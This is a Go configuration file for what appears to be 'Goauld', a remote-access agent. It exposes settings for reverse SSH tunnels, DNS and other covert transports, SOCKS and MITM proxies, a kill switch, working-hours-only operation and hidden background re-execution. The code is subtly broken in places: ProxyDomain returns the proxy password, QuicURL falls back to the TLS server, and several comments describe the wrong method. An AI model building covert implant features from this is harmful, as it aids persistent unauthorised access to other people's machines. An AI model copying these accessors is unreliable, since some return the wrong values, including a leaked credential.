package config

import (
	"Goauld/agent/ssh/transport/dns"
	"Goauld/common"
	"Goauld/common/crypto"
	exec2 "Goauld/common/exec"
	"Goauld/common/ssh"
	"Goauld/common/utils"
	"Goauld/common/wireguard"
	"fmt"
	"net/url"
	"os"
	"os/exec"
	"runtime"
	"strings"
	"time"
)

// Agent the dynamic agent configuration.
type Agent struct {
	ID                       string
	SSHPrivateKey            string
	SharedSecret             string
	Cryptor                  *crypto.SymCryptor
	cfg                      *AgentConfig
	IsStaticPasswordDynamic  bool
	RemoteDynamicPortForward []int
	RemotePortForward        []int
	Platform                 string
	Architecture             string
	Username                 string
	Hostname                 string
	IPs                      []string
	Path                     string
	UnChunkDone              chan []byte
	WorkingDay               WorkingDay
	Wireguard                wireguard.WGConfig
	SSHTunnelMode            string
	ControlTunnelMode        string
}

// LocalSSHDPassword returns the current ssh password allowing to connect.
func (a *Agent) LocalSSHDPassword() string {
	return a.cfg.LocalSSHPassword
}

// Version returns the agent version.
func (a *Agent) Version() common.JVersion {
	return common.JSONVersion()
}

// NoProxy return whether the agent should ignore the potential system proxy.
func (a *Agent) NoProxy() bool {
	return a.cfg.NoProxy
}

// Proxy returns the proxy provided by the configuration.
func (a *Agent) Proxy() *url.URL {
	return a.cfg.Proxy
}

// ProxyUsername returns the username used by the proxy.
func (a *Agent) ProxyUsername() string {
	return a.cfg.ProxyUsername
}

// ProxyPassword returns the password used by the proxy.
func (a *Agent) ProxyPassword() string {
	return a.cfg.ProxyPassword
}

// ProxyDomain returns the domain used by the proxy.
func (a *Agent) ProxyDomain() string {
	return a.cfg.ProxyPassword
}

// SocksProxy returns the proxy provided by the configuration.
func (a *Agent) SocksProxy() *url.URL {
	if a.cfg.SocksCustomProxy != nil {
		return a.cfg.SocksCustomProxy
	}

	return a.cfg.Proxy
}

// SocksProxyUsername returns the username used by the upstream proxy of the socks proxy.
func (a *Agent) SocksProxyUsername() string {
	if a.cfg.SocksProxyUsername != "" {
		return a.cfg.SocksProxyUsername
	}

	return a.cfg.ProxyUsername
}

// SocksProxyPassword returns the username used by the upstream proxy of the socks proxy.
func (a *Agent) SocksProxyPassword() string {
	if a.cfg.SocksProxyPassword != "" {
		return a.cfg.SocksProxyPassword
	}

	return a.cfg.ProxyPassword
}

// SocksProxyDomain returns the username used by the upstream proxy of the socks proxy.
func (a *Agent) SocksProxyDomain() string {
	if a.cfg.SocksProxyDomain != "" {
		return a.cfg.SocksProxyDomain
	}

	return a.cfg.ProxyDomain
}

// MITMHTTPProxyEnabled returns whether the http proxy server is enabled.
func (a *Agent) MITMHTTPProxyEnabled() bool {
	if runtime.GOOS != "windows" {
		return false
	}
	return a.cfg.MITMHTTP
}

// MITMProxyUsername returns the username used by the upstream proxy of the socks proxy.
func (a *Agent) MITMProxyUsername() string {
	return a.cfg.MITMHTTPProxyUsername
}

// MITMProxyPassword returns the username used by the upstream proxy of the socks proxy.
func (a *Agent) MITMProxyPassword() string {
	return a.cfg.MITMHTTPProxyPassword
}

// MITMProxyDomain returns the username used by the upstream proxy of the socks proxy.
func (a *Agent) MITMProxyDomain() string {
	return a.cfg.MITMHTTPProxyDomain
}

// HTTPProxy returns the proxy provided by the configuration.
func (a *Agent) HTTPProxy() *url.URL {
	if a.cfg.SocksCustomProxy != nil {
		return a.cfg.SocksCustomProxy
	}

	return a.cfg.Proxy
}

// HTTPProxyUsername returns the username used by the upstream proxy of the socks proxy.
func (a *Agent) HTTPProxyUsername() string {
	if a.cfg.SocksProxyUsername != "" {
		return a.cfg.SocksProxyUsername
	}

	return a.cfg.ProxyUsername
}

// HTTPProxyPassword returns the username used by the upstream proxy of the socks proxy.
func (a *Agent) HTTPProxyPassword() string {
	if a.cfg.SocksProxyPassword != "" {
		return a.cfg.SocksProxyPassword
	}

	return a.cfg.ProxyPassword
}

// HTTPProxyDomain returns the username used by the upstream proxy of the socks proxy.
func (a *Agent) HTTPProxyDomain() string {
	if a.cfg.SocksProxyDomain != "" {
		return a.cfg.SocksProxyDomain
	}

	return a.cfg.ProxyDomain
}

// DNSServer returns the DNS servers that will be used to tunnel the connection.
func (a *Agent) DNSServer() []string {
	var servers []string
	for _, srv := range a.cfg.DNSServer {
		if strings.EqualFold(srv, "system") {
			for _, systemDNSServer := range dns.GetDNSServers() {
				servers = append(servers, systemDNSServer.String())
			}
		} else {
			servers = append(servers, srv)
		}
	}

	return servers
}

// normalizeAddr transform the incoming url to ensure that a scheme and a port are always present
// It tries to allocate the corresponding port/scheme (HTTPS/443, HTTP/80, etc.)
func normalizeAddr(input string) string {
	// 1) Split off any “scheme://”
	hasScheme := strings.Contains(input, "://")
	working := input
	if !hasScheme {
		// Tentatively prepend a fake scheme, so url.Parse will let us split Host vs Path
		working = "http://" + working
	}

	u, err := url.Parse(working)
	if err != nil {
		return ""
	}

	host := u.Hostname()
	port := u.Port()

	// 2) Decide on a scheme if missing
	scheme := u.Scheme
	if !hasScheme {
		if port == "443" {
			scheme = "https"
		} else {
			scheme = "http"
		}
	}

	// 3) Decide on port if missing
	if port == "" {
		switch scheme {
		case "https":
			port = "443"
		default:
			port = "80"
		}
	}

	// Recombine
	// note: u.Path, u.User, u.RawQuery etc. are ignored here; this is just host:port normalization
	return fmt.Sprintf("%s://%s:%s", scheme, host, port)
}

// ServerURL return the HTTP control server URL.
func (a *Agent) ServerURL() string {
	u := normalizeAddr(a.cfg.Server)
	if u != "" {
		return u
	}
	switch {
	case strings.HasPrefix(a.cfg.Server, "http://"):
		u = a.cfg.Server
	case strings.HasPrefix(a.cfg.Server, "https://"):
		u = a.cfg.Server
	default:
		u = "http://" + a.cfg.Server
	}

	return u
}

// WSshURL return the SSH over Websocket connection URL.
func (a *Agent) WSshURL(id string) string {
	if id == "" {
		id = a.ID
	}

	return fmt.Sprintf("%s/wssh/%s", a.ServerURL(), id)
}

// SocketIoURL return the control connection URL.
func (a *Agent) SocketIoURL(id string) string {
	if id == "" {
		id = a.ID
	}

	return fmt.Sprintf("%s/live/%s/", a.ServerURL(), id)
}

// SSHTTPURL return the SSH over HTTP connection URL.
func (a *Agent) SSHTTPURL(id string) string {
	if id == "" {
		id = a.ID
	}

	return fmt.Sprintf("%s/sshttp/%s", a.ServerURL(), id)
}

// SSHTTPURL return the SSH over HTTP connection URL.
func (a *Agent) CDNURL(id string) string {
	if id == "" {
		id = a.ID
	}

	return fmt.Sprintf("%s/sshttp2/%s", a.ServerURL(), id)
}

// TLSURL return the SSH over TLS connection URL.
func (a *Agent) TLSURL() string {
	u := strings.Split(a.cfg.TLSServer, ":")
	if len(u) == 1 {
		return a.cfg.TLSServer + ":443"
	}

	return a.cfg.TLSServer
}

// QuicURL return the SSH over TLS connection URL.
func (a *Agent) QuicURL() string {
	u := strings.Split(a.cfg.QuicServer, ":")
	if len(u) == 1 {
		return a.cfg.QuicServer + ":443"
	}

	return a.cfg.TLSServer
}

// Name returns the agent name.
func (a *Agent) Name() string {
	return a.cfg.Name
}

// KeepAwake returns whether the agent should try to keep the underlying system awake.
func (a *Agent) KeepAwake() bool {
	return a.cfg.KeepAwake
}

// GetKeepalive returns the duration between two keepalive pings.
func (a *Agent) GetKeepalive() time.Duration {
	return time.Duration(a.cfg.KeepAlive)
}

// OnlyWorkingDays return whether the OnlyWorkingDay option is enabled.
func (a *Agent) OnlyWorkingDays() bool {
	return a.cfg.OnlyWorkingDays
}

func (a *Agent) SetRSSHOrder(order []string) {
	a.cfg.RSSHOrder = order
}

func (a *Agent) SetRelayServerAsTarget() {
	a.cfg.Server = a.cfg.RelayAddr
}

func (a *Agent) UseRelay() bool {
	return a.cfg.RelayAddr != ""
}

// GetRSSHOrder returns the order that the agent should follow to attempt to connect
// to the SSHD server.
func (a *Agent) GetRSSHOrder() []string {
	return utils.ToLower(utils.Unique(a.cfg.RSSHOrder))
}

// GetSSHTimeout return the SSH timeout used when setting up the ssh connection.
func (a *Agent) GetSSHTimeout() time.Duration {
	if a.cfg.SSHTimeout == 0 {
		return time.Duration(1<<63 - 1)
	}

	return time.Duration(a.cfg.SSHTimeout) * time.Second
}

// AgePubKey returns the age public key used to asymmetrically encrypt data.
func (a *Agent) AgePubKey() string {
	return a.cfg.AgePubKey
}

// SshdEnabled returns whether the sshd server is enabled.
func (a *Agent) SshdEnabled() bool {
	return a.cfg.Sshd
}

// HTTPProxyEnabled returns whether the http proxy server is enabled.
func (a *Agent) HTTPProxyEnabled() bool {
	return a.cfg.HTTP
}

// SocksEnabled returns whether the socks server is enabled.
func (a *Agent) SocksEnabled() bool {
	return a.cfg.Socks || a.cfg.SocksPort != 0
}

// SocksUseSystemProxy returns whether the agent Socks proxy should use the system proxy (if applicable).
func (a *Agent) SocksUseSystemProxy() bool {
	return a.cfg.SocksUseSystemProxy
}

// DNSDomain returns the DNS domain that will be used to query the DNS server.
func (a *Agent) DNSDomain() string {
	return a.cfg.DNSServerDomain
}

// DNSDomainAlt returns the DNS domain that will be used to query the DNS server.
func (a *Agent) DNSDomainAlt() string {
	return a.cfg.DNSServerDomainAlt
}

// ControlSSHServer returns the SSHD server.
func (a *Agent) ControlSSHServer() string {
	return a.cfg.SSHServer
}

// IsRemoteForwardedSshdPortRandom returns whether the remote forwarded SSHD port is random.
func (a *Agent) IsRemoteForwardedSshdPortRandom() bool {
	return a.cfg.RSSHPort == 0
}

// RsshPort returns the remote forwarded SSHD port.
func (a *Agent) RsshPort() int {
	return a.cfg.RSSHPort
}

// RemoteForwardedSshdAddress returns the remote forwarded SSHD address.
func (a *Agent) RemoteForwardedSshdAddress() string {
	return fmt.Sprintf("127.0.0.1:%d", a.cfg.RSSHPort)
}

// RemoteForwardedSocksAddress returns the remote forwarded Socks address.
func (a *Agent) RemoteForwardedSocksAddress() string {
	return fmt.Sprintf("127.0.0.1:%d", a.cfg.SocksPort)
}

// RemoteForwardedWGAddress returns the remote forwarded wireguard address.
func (a *Agent) RemoteForwardedWGAddress() string {
	return fmt.Sprintf("127.0.0.1:%d", a.cfg.WGPort)
}

// RemoteForwardedHTTPProxyAddress returns the remote forwarded Socks address.
func (a *Agent) RemoteForwardedHTTPProxyAddress() string {
	return fmt.Sprintf("127.0.0.1:%d", a.cfg.HTTPProxyPort)
}

// RemoteForwardedHTTPProxyPort returns the remote forwarded HTTP port.
func (a *Agent) RemoteForwardedHTTPProxyPort() int {
	return a.cfg.HTTPProxyPort
}

// RemoteForwardedSocksPort returns the remote forwarded Socks port.
func (a *Agent) RemoteForwardedSocksPort() int {
	return a.cfg.SocksPort
}

// RemoteForwardedSshdPort returns the remote forwarded SSHD port.
func (a *Agent) RemoteForwardedSshdPort() int {
	return a.cfg.RSSHPort
}

// UpdateSocksPort set the new socks port.
func (a *Agent) UpdateSocksPort(port int) {
	a.cfg.SocksPort = port
}

// UpdateWGPort set the new socks port.
func (a *Agent) UpdateWGPort(port int) {
	a.cfg.WGPort = port
}

// UpdateHTTPProxyPort set the new socks port.
func (a *Agent) UpdateHTTPProxyPort(port int) {
	a.cfg.HTTPProxyPort = port
}

// UpdateSshdPort set the new sshd port.
func (a *Agent) UpdateSshdPort(port int) {
	a.cfg.RSSHPort = port
}

// AddSshdToRpf adds the SSHD conf to the Remote port forwarding list.
func (a *Agent) AddSshdToRpf() {
	sshdRpf := ssh.RemotePortForwarding{
		ServerPort: a.cfg.RSSHPort,
		AgentPort:  -1,
		AgentIP:    "0.0.0.0",
		Tag:        "sshd",
	}
	a.cfg.RemotePortForwarding = append(a.cfg.RemotePortForwarding, sshdRpf)
}

// AddSocksToRpf adds the SSHD conf to the Remote port forwarding list.
func (a *Agent) AddSocksToRpf() {
	sshdRpf := ssh.RemotePortForwarding{
		ServerPort: a.cfg.SocksPort,
		AgentPort:  -1,
		AgentIP:    "0.0.0.0",
		Tag:        "socks",
	}
	a.cfg.RemotePortForwarding = append(a.cfg.RemotePortForwarding, sshdRpf)
}

// AddWGToRpf adds the SSHD conf to the Remote port forwarding list.
func (a *Agent) AddWGToRpf(port int) {
	sshdRpf := ssh.RemotePortForwarding{
		ServerPort: a.cfg.WGPort,
		AgentPort:  port,
		AgentIP:    "0.0.0.0",
		Tag:        "WG",
	}
	a.cfg.RemotePortForwarding = append(a.cfg.RemotePortForwarding, sshdRpf)
}

// GetDNSCommand return the DNS command to perform SSH over DNS using a custom DNS.
func (a *Agent) GetDNSCommand() string {
	return a.cfg.CustomDNSCommand
}

// DoPrintVersion return whether the version must be printed.
func (a *Agent) DoPrintVersion() bool {
	return a.cfg.Version
}

// ShouldRunInBackground returns whether the agent should be run in the background.
func (a *Agent) ShouldRunInBackground() bool {
	return a.cfg.Background && !a.cfg.HiddenBackground
}

// StartInBackground re-execute the agent in the background.
// A hidden flag is appended to the command line
// to notify the child process that is already running in the background.
func (a *Agent) StartInBackground() error {
	exe, err := os.Executable()
	if err != nil {
		return err
	}
	args := os.Args[1:]
	for i := range args {
		if args[i] == "--background" {
			args[i] = "--hidden-background"
		}
	}
	//nolint:gosec
	c := exec.Command(exe, args...)
	c = exec2.Backgrounize(c)

	err = c.Start()
	if err != nil {
		return fmt.Errorf("failed to start agent: %w", err)
	}

	return nil
}

// GetMexRetries returns the configured max retries before killing the agent.
func (a *Agent) GetMexRetries() uint {
	//nolint:gosec
	return uint(a.cfg.MaxRetries)
}

// DoGenerateConfig return whether the configuration generation should be enabled.
func (a *Agent) DoGenerateConfig() bool {
	return a.cfg.GenerateConfig
}

// GetKillSwitchDays returns the configured killswitch.
func (a *Agent) GetKillSwitchDays() int {
	return a.cfg.KillSwitch
}

func (a *Agent) IgnoredArgs() []string {
	return a.cfg.Remaining
}

func (a *Agent) Relay() string {
	return a.cfg.RelayAddr
}
